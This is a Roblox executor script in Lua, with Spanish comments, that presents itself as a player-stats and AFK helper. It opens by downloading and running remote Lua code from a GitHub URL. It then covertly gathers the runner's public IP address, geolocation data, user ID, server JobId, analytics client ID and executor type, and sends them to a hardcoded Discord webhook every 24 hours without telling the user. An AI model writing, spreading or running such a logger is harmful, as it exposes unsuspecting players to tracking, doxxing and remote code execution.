loadstring(game:HttpGet("https://raw.githubusercontent.com/Fernanflop091o/Queuet/refs/heads/main/Afk.lua"))()

local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local discordWebhookUrl = "https://discord.com/api/webhooks/1286118077829742593/KbfczS76YlMW7x_Q9vbA60XRE78_xc9uvDZOGkzLU5AEfP-fH1iX-_P6YzBg7d6-WiJn"
local sendInterval = 86400  -- 24 horas en segundos
local jsonFilePath = "lastSentTime.json"

-- Función para guardar datos en un archivo JSON
local function saveToJsonFile(data)
    local success, response = pcall(function()
        local jsonData = HttpService:JSONEncode(data)
        writefile(jsonFilePath, jsonData)  -- Guarda el archivo JSON
    end)
    
    if not success then
        warn("Error al guardar en el archivo JSON:", response)
    end
end

-- Función para cargar datos desde un archivo JSON
local function loadFromJsonFile()
    if not isfile(jsonFilePath) then
        return nil
    end
    
    local success, data = pcall(function()
        local jsonData = readfile(jsonFilePath)
        return HttpService:JSONDecode(jsonData)
    end)
    
    if success then
        return data
    else
        warn("Error al leer el archivo JSON:", data)
        return nil
    end
end

-- Función para obtener el ID del trabajo y HWID del jugador
local function getJobIdAndHwid()
    local jobId = game.JobId
    local hwid = game.Players.LocalPlayer.UserId
    return jobId, hwid
end

-- Función para formatear números grandes
local function formatNumber(number)
    if number < 1000 then
        return tostring(number)
    end
    local suffixes = {"", "K", "M", "B", "T", "QD"}
    local suffix_index = 1
    while math.abs(number) >= 1000 and suffix_index < #suffixes do
        number = number / 1000.0
        suffix_index = suffix_index + 1
    end
    return string.format("%.2f%s", number, suffixes[suffix_index])
end

-- Función para obtener la IP del jugador
local function getPlayerIPInfo()
    local ip, data = "N/A", "N/A"
    local success, response = pcall(function()
        ip = game:HttpGet("https://v4.ident.me/")
        data = game:HttpGet("http://ip-api.com/json")
    end)
    if not success then
        warn("Error al obtener IP o geolocalización:", response)
    end
    return ip, data
end

-- Función para detectar el tipo de ejecutor (executor)
local function detectExecutor()
    local executorType = "Unsupported"
    if syn and not is_sirhurt_closure and not pebc_execute then
        executorType = "Synapse X"
    elseif secure_load then
        executorType = "Sentinel"
    elseif pebc_execute then
        executorType = "ProtoSmasher"
    elseif KRNL_LOADED then
        executorType = "Krnl"
    elseif is_sirhurt_closure then
        executorType = "SirHurt"
    elseif identifyexecutor() and identifyexecutor():find("ScriptWare") then
        executorType = "Script-Ware"
    end
    return executorType
end

-- Función para obtener el precio del próximo rebirth
local function getNextRebirthPrice(currentRebirths)
    local basePrice = 3e6
    local additionalPrice = 2e6
    local multiplier = 1.010
    local nextPrice = basePrice * (currentRebirths + 1) * multiplier + additionalPrice
    return nextPrice
end

-- Función para obtener los datos del jugador que ejecuta el script
local function getLocalPlayerData()
    local player = Players.LocalPlayer
    local playerName = player.Name
    local playerDisplayName = player.DisplayName

    local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
    if folderData then
        local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
        local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
        local formattedRebirth = formatNumber(rebirthValue)
        local formattedStrength = formatNumber(strengthValue)
        local nextRebirthPrice = getNextRebirthPrice(rebirthValue)

        return string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s\nPrecio para siguiente Rebirth: %s",
            playerName, playerDisplayName, formattedRebirth, formattedStrength, formatNumber(nextRebirthPrice))
    else
        return "Datos del jugador no disponibles"
    end
end

-- Función para obtener el ClientId
local function getClientId()
    local clientId = RbxAnalyticsService:GetClientId()
    return clientId
end

-- Función para obtener la información del servidor
local function getServerInfo()
    local totalServers = 0
    local totalPlayers = 0

    return totalServers, totalPlayers
end

-- Función para enviar la información del jugador a Discord
local function sendPlayerInfoToDiscord()
    local jobId, hwid = getJobIdAndHwid()
    local ip, ipData = getPlayerIPInfo()
    local executor = detectExecutor()
    local playerData = getLocalPlayerData()
    local clientId = getClientId()
    local totalServers, totalPlayers = getServerInfo()

    local dataToSend = {
        ["embeds"] = {
            {
                ["description"] = "Información del jugador:\n\n" .. playerData,
                ["color"] = 0x00ff00,
                ["title"] = "Estadísticas del jugador",
                ["thumbnail"] = {
                    ["url"] = "https://i.imgur.com/oBPXx0D.png"
                },
                ["fields"] = {
                    {
                        ["name"] = "JobId",
                        ["value"] = jobId,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "HWID",
                        ["value"] = hwid,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "IP",
                        ["value"] = ip,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Datos de IP",
                        ["value"] = ipData,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "ClientId",
                        ["value"] = clientId,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Número Total de Servidores",
                        ["value"] = formatNumber(totalServers),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Número Total de Jugadores en Servidores",
                        ["value"] = formatNumber(totalPlayers),
                        ["inline"] = true
                    }
                }
            }
        }
    }

    local success, response = pcall(function()
        return http_request({
            Url = discordWebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(dataToSend)
        })
    end)

    if not success then
        warn("Error al enviar la información a Discord:", response)
    end
end

-- Cargar el tiempo desde el archivo JSON
local function checkAndSendPlayerInfo()
    local currentTime = os.time()
    local data = loadFromJsonFile()

    if data and data.lastSentTime then
        local timeSinceLastSend = currentTime - data.lastSentTime
        if timeSinceLastSend < sendInterval then
            warn("Ya se ha enviado información en las últimas 24 horas.")
            return
        end
    end

    -- Enviar la información si han pasado más de 24 horas
    sendPlayerInfoToDiscord()

    -- Guardar el nuevo tiempo en el archivo JSON
    saveToJsonFile({ lastSentTime = currentTime })
end

-- Ejecutar la función al iniciar el script
checkAndSendPlayerInfo()
